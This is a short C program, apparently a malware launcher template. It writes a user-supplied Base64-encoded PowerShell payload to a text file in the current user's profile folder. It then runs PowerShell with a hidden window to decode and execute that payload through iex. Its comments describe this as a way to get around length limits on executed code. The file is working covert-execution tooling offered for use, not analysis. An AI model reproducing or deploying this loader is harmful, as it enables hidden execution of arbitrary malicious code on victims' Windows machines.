#include <stdio.h>
#include <stdlib.h> // to let system function works

// You Can Use The System Function only ans insert Base64 Directly in [system Convert] but we generat a txt file becuase there is a limit to the length of code passed to iex in powershell , but like this you can use any length of code with no Problem 

int main()
{
        char name[] = "// Insert The Base64 of Your Powershell Code ";
        char* a = getenv("USERNAME");
        char* extension = "Base.txt";
        char fileSpec[strlen(a)+strlen(extension)+20];
        FILE *out;
        snprintf( fileSpec, sizeof( fileSpec ), "C:\\Users\\%s\\Base.txt", a);
        out = fopen( fileSpec, "w" );
        printf("C:\\Users\\%s\\%s,,%s\n",a,extension,fileSpec);
        fprintf(out,"%s" , name);
        fclose(out);

        system("powershell -noprofile -windowstyle hidden iex ([System.Text.Encoding]::ASCII.GetString([system.Convert]::FromBase64String((get-content c:\\users\\$env:username\\Base.txt))));");

   
}
